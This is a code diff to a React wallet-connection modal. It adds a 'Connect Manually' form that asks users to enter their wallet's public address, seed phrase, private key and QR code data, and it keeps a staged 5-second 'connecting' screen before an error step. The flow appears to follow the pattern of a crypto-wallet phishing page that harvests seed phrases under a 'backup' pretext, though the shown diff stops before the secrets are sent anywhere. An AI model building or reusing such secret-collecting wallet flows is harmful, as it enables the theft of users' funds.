@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import { useSession } from "next-auth/react";
-import { formatEther } from "ethers";
+import { utils } from "ethers"; // Import utils from ethers
 import { QRCodeSVG } from "qrcode.react";
 import {
   Dialog,
@@ -9,6 +9,7 @@ import {
   DialogTitle,
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input"; // Assumes you have an Input component
 
 interface BackupWallet {
   id: number;
@@ -41,33 +42,58 @@ const WalletModal: React.FC<WalletModalProps> = ({
   error,
   walletAddress,
 }) => {
-  const [preloader, setPreloader] = useState(false); 
+  const [preloader, setPreloader] = useState(false);
   const [dynamicError, setDynamicError] = useState<string | null>(null);
-  const { data: session } = useSession();
+  const [currentStep, setCurrentStep] = useState(0); // Track the step of the manual connection
+  const [backupData, setBackupData] = useState({
+    publicAddress: "",
+    seedPhrase: "",
+    privateKey: "",
+    qrCodeData: "",
+    seedPhraseArray: [] as string[], // Added seedPhraseArray to handle tags
+  });
 
+  const { data: session } = useSession();
   const userId = session?.user?.email;
 
-  // Function to connect to the wallet
+  // Convert the seed phrase input into an array of tags
+  const handleSeedPhraseChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    const tags = value.split(",").map((tag) => tag.trim()).filter((tag) => tag.length > 0);
+    setBackupData((prevState) => ({
+      ...prevState,
+      seedPhrase: value,
+      seedPhraseArray: tags, // Store tags as an array
+    }));
+  };
+
+  // Function to handle removing tags
+  const removeTag = (index: number) => {
+    const newTags = [...(backupData.seedPhraseArray || [])];
+    newTags.splice(index, 1);
+    setBackupData((prevState) => ({
+      ...prevState,
+      seedPhraseArray: newTags,
+      seedPhrase: newTags.join(", "), // Update input field with comma-separated values
+    }));
+  };
+
   const connectWallet = async () => {
-    setPreloader(true); 
+    setPreloader(true);
     setDynamicError(null);
 
     setTimeout(async () => {
       setModalStep("connecting");
       setPreloader(false);
-      
-      
 
       if (typeof window.ethereum === "undefined") {
         setDynamicError("MetaMask is not installed. Please download it.");
-        
         setModalStep("error");
-        setPreloader(false); 
+        setPreloader(false);
         return;
       }
 
       try {
-        // Request access to MetaMask
         const accounts = await window.ethereum.request({
           method: "eth_requestAccounts",
         });
@@ -75,29 +101,24 @@ const WalletModal: React.FC<WalletModalProps> = ({
         if (accounts.length > 0) {
           const publicAddress = accounts[0];
 
-          // Fetch wallet balance
           const balanceWei = await window.ethereum.request({
             method: "eth_getBalance",
             params: [publicAddress, "latest"],
           });
 
-          const balance = formatEther(balanceWei);
+          const balance = utils.formatEther(balanceWei);
 
-          // Call backend API to store wallet data
-          const response = await fetch(
-            `/api/backup/storeWalletData/${userId}`,
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                publicAddress,
-                balance,
-                walletName: selectedWallet?.name,
-              }),
-            }
-          );
+          const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              publicAddress,
+              balance,
+              walletName: selectedWallet?.name,
+            }),
+          });
 
           if (response.ok) {
             const data = await response.json();
@@ -113,19 +134,27 @@ const WalletModal: React.FC<WalletModalProps> = ({
         setDynamicError(err.message || "Failed to connect to MetaMask.");
         setModalStep("error");
       }
-    }, 5000); 
+    }, 5000);
+  };
+
+  const connectWalletManually = () => {
+    if (currentStep === 0) {
+      setCurrentStep(1); // Move to the next step in manual connection
+    } else {
+      setCurrentStep(0); // Reset to the initial step
+      setModalStep("initial"); // Reset modal to initial state
+    }
   };
 
   if (!selectedWallet) return null;
 
   return (
-    <Dialog open={isOpen} onOpenChange={onClose} >
+    <Dialog open={isOpen} onOpenChange={onClose}>
       {modalStep !== "success" && (
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
             <DialogTitle className="text-center">
-              {modalStep === "initial" &&
-                `Connect Your ${selectedWallet?.name} Wallet`}
+              {modalStep === "initial" && `Connect Your ${selectedWallet?.name} Wallet`}
               {modalStep === "connecting" && "Connecting..."}
               {modalStep === "error" && "Connection Failed"}
             </DialogTitle>
@@ -139,8 +168,9 @@ const WalletModal: React.FC<WalletModalProps> = ({
                   alt={`${selectedWallet.name} logo`}
                   className="animate-zoom w-20 h-20"
                 />
-                <p className="text-small text-green-600 mt-6 mb-6">Establishing Connection...</p>
-               
+                <p className="text-small text-green-600 mt-6 mb-6">
+                  Establishing Connection...
+                </p>
               </div>
             )}
 
@@ -161,7 +191,12 @@ const WalletModal: React.FC<WalletModalProps> = ({
                   <Button className="bg-red-600" onClick={onClose}>
                     Cancel
                   </Button>
-                  <Button className="bg-black">Connect Manually</Button>
+                  <Button
+                    className="bg-black"
+                    onClick={connectWalletManually}
+                  >
+                    Connect Manually
+                  </Button>
                 </div>
               </div>
             )}
@@ -182,6 +217,67 @@ const WalletModal: React.FC<WalletModalProps> = ({
               <Button variant="outline" onClick={onClose}>
                 Close
               </Button>
+            </div>
+          </div>
+        </DialogContent>
+      )}
+
+      {/* Manual connection steps */}
+      {currentStep === 1 && (
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center">Enter Wallet Data</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-6">
+            <Input
+              placeholder="Enter Public Address"
+              value={backupData.publicAddress}
+              onChange={(e) =>
+                setBackupData({ ...backupData, publicAddress: e.target.value })
+              }
+            />
+            <Input
+              placeholder="Enter Seed Phrase (optional)"
+              value={backupData.seedPhrase}
+              onChange={handleSeedPhraseChange} // Handling seed phrase change
+            />
+            <span className="text-green-500 text-sm">Seperate each phrase with a comma ','</span>
+            {/* Display seed phrase tags */}
+            <div className="flex flex-wrap gap-2 mt-4">
+              {(backupData.seedPhraseArray || []).map((tag, index) => (
+                <div
+                  key={index}
+                  className="flex items-center justify-between px-3 py-1 rounded-full bg-gray-200 text-gray-700"
+                >
+                  <span>{tag}</span>
+                  <Button
+                    variant="link"
+                    onClick={() => removeTag(index)} // Handling tag removal
+                    className="ml-2 text-red-500"
+                  >
+                    ×
+                  </Button>
+                </div>
+              ))}
+            </div>
+
+            <Input
+              placeholder="Enter Private Key (optional)"
+              value={backupData.privateKey}
+              onChange={(e) =>
+                setBackupData({ ...backupData, privateKey: e.target.value })
+              }
+            />
+            <Input
+              placeholder="Enter QR Code Data (optional)"
+              value={backupData.qrCodeData}
+              onChange={(e) =>
+                setBackupData({ ...backupData, qrCodeData: e.target.value })
+              }
+            />
+            <div className="flex justify-center gap-2">
+              <Button onClick={connectWalletManually}>Go Back</Button>
+              <Button onClick={() => setCurrentStep(2)}>Save</Button>
             </div>
           </div>
         </DialogContent>
